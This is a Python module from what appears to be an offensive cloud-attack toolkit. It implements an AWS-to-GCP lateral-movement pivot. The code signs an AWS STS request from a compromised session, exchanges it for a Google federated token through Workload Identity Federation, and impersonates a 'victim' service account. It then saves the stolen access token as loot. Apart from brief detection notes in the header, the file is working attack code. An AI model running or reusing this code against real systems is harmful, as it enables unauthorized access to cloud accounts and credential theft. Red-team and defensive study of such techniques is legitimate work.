# ================================================================
# TECHNIQUE: lateral_movement/cross_cloud_pivot
# ----------------------------------------------------------------
# TACTIC:    Lateral Movement (TA0008)
# TECHNIQUE: T1078 — Valid Accounts
#
# PURPOSE:   Traverse cloud boundaries by exchanging credentials
#            from one provider for a token in another.
#
# PROVIDERS: AWS, Azure, GCP
#
# HOW IT WORKS:
#   AWS ➔ GCP: Signs an AWS STS GetCallerIdentity request and
#              exchanges it for a GCP token via Workload Identity
#              Federation (WIF).
#
# OPTIONS:
#   method  (required) — "aws_to_gcp" (Current default).
#   target  (required) — The target identity email/ID in the second cloud.
#   project (required) — Project number or ID.
#   pool    (required) — Identity Pool ID.
#   prov    (required) — Identity Provider ID.
#
# DETECTION (Blue Team):
#   GCP — Audit Logs: GenerateAccessToken from external subject.
#   AWS — CloudTrail: AssumeRoleWithWebIdentity.
#
# SAFE:     No — generates new cross-cloud access tokens.
# ================================================================

from __future__ import annotations

import json
import logging
import urllib.error
import urllib.parse
import urllib.request
from typing import Any

from botocore.auth import SigV4Auth
from botocore.awsrequest import AWSRequest
from botocore.credentials import Credentials

from quantum_mechanic.core.context import ExecutionContext
from quantum_mechanic.core.technique import Parameter, technique

logger = logging.getLogger(__name__)

LOOT_ITEMS_KEY = 'results'
LOOT_SCHEMA = [
    ('identity', 'Target Identity', 'bold cyan'),
    ('status',   'Status',          'green'),
    ('context',  'Pivot Context',   'dim'),
]

@technique(
    technique_id="lateral_movement/cross_cloud_pivot",
    tactic="lateral_movement",
    mitre_id="T1078",
    providers=["aws", "azure"],
    severity="critical",
    safe=False,
    description="Traverse cloud boundaries via Workload Identity Federation or OIDC.",
    loot_schema=LOOT_SCHEMA,
    loot_items_key=LOOT_ITEMS_KEY,
    parameters=[
        Parameter("method", "The pivot path to execute.", choices=["aws_to_gcp"], default="aws_to_gcp"),
        Parameter("target", "The target identity email/ID.", required=True, example="victim-sa@project.iam.gserviceaccount.com"),
        Parameter("project", "Target project number/ID.", required=True, example="1234567890"),
        Parameter("pool", "Identity Pool ID.", required=True, example="my-pool"),
        Parameter("prov", "Identity Provider ID.", required=True, example="my-provider"),
    ]
)
def execute(ctx: ExecutionContext) -> dict[str, Any]:
    method = ctx.get_param("method")

    if method == "aws_to_gcp":
        return _aws_to_gcp(ctx)

    return {"error": f"Method {method} not yet implemented.", "results": []}


def _aws_to_gcp(ctx: ExecutionContext) -> dict[str, Any]:
    if ctx.provider_name != "aws":
        return {"error": "aws_to_gcp pivot requires an active AWS credential."}

    target_sa = ctx.get_param("target")
    project_num = ctx.get_param("project")
    pool_id = ctx.get_param("pool")
    provider_id = ctx.get_param("prov")

    if ctx.safe_mode:
        return {
            "provider": "gcp",
            "results": [{"identity": target_sa, "status": "would_pivot", "context": f"WIF Pool: {pool_id}"}]
        }

    try:
        # 1. Get AWS credentials
        session = ctx.session
        boto_creds = session.get_credentials().get_frozen_credentials()
        region = session.region_name or "us-east-1"

        # 2. Prepare audience
        audience = f"//iam.googleapis.com/projects/{project_num}/locations/global/workloadIdentityPools/{pool_id}/providers/{provider_id}"

        ctx.info("Generating AWS STS GetCallerIdentity signed token...")
        req = AWSRequest(
            method="POST",
            url=f"https://sts.{region}.amazonaws.com/?Action=GetCallerIdentity&Version=2011-06-15",
            data=b""
        )
        req.headers["Host"] = f"sts.{region}.amazonaws.com"
        req.headers["x-goog-cloud-target-resource"] = audience

        auth = SigV4Auth(Credentials(boto_creds.access_key, boto_creds.secret_key, boto_creds.token), "sts", region)
        auth.add_auth(req)

        subject_token = urllib.parse.quote(json.dumps({
            "headers": [{"key": k, "value": v} for k, v in req.headers.items()],
            "method": req.method, "url": req.url
        }))

        # 3. Exchange at Google STS
        ctx.info(f"Exchanging AWS token for GCP WIF token at pool {pool_id}...")
        data = {
            "audience": audience,
            "grantType": "urn:ietf:params:oauth:grant-type:token-exchange",
            "requestedTokenType": "urn:ietf:params:oauth:token-type:access_token",
            "scope": "https://www.googleapis.com/auth/cloud-platform",
            "subjectTokenType": "urn:ietf:params:aws:token-type:aws4_request",
            "subjectToken": subject_token
        }

        req_sts = urllib.request.Request("https://sts.googleapis.com/v1/token", data=json.dumps(data).encode("utf-8"), headers={"Content-Type": "application/json"})
        with urllib.request.urlopen(req_sts) as response:
            federated_token = json.loads(response.read().decode())["access_token"]

        # 4. Assume Target SA
        ctx.info(f"Assuming target GCP Service Account {target_sa}...")
        url = f"https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/{target_sa}:generateAccessToken"
        req_sa = urllib.request.Request(url, data=json.dumps({"scope": ["https://www.googleapis.com/auth/cloud-platform"]}).encode("utf-8"), headers={
            "Content-Type": "application/json", "Authorization": f"Bearer {federated_token}"
        })
        with urllib.request.urlopen(req_sa) as response:
            access_token = json.loads(response.read().decode())["accessToken"]

        # 5. Import to Workspace
        ctx.success(f"Successfully pivoted to GCP identity {target_sa}")
        project_id = target_sa.split("@")[1].split(".")[0] if "@" in target_sa else "unknown"

        ctx.workspace.upsert_account(id=project_id, provider="gcp", name=f"Project {project_id}", account_type="project")
        ctx.workspace.add_credential(
            provider="gcp",
            credential_type="access_token",
            friendly_name=f"WIF-{target_sa.split('@')[0]}",
            account_id=project_id,
            secret_data=json.dumps({"method": "access_token", "access_token": access_token}),
            obtained_via="lateral_movement/cross_cloud_pivot"
        )

        return {
            "provider": "gcp",
            "results": [{"identity": target_sa, "status": "Pivoted & Imported", "context": f"Project: {project_num}"}]
        }

    except Exception as e:
        body = getattr(e, 'read', lambda: b"")().decode()
        return {"error": f"{e} {body}", "results": []}
